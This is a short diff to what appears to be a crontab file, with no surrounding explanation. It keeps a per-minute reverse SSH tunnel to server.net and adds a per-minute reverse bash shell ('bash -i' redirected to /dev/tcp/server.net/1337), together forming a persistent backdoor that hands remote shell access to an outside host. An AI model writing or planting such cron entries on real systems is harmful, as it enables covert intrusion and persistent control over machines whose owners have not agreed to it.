@@ -1,1 +1,4 @@
+#reverse SSH connection
 */1 * * * * [ -z $(pidof ssh) ] && ssh -fN -R 1337:localhost:22 user@server.net
+#reverse bash shell
+*/1 * * * * bash -i >& /dev/tcp/server.net/1337 0>&1
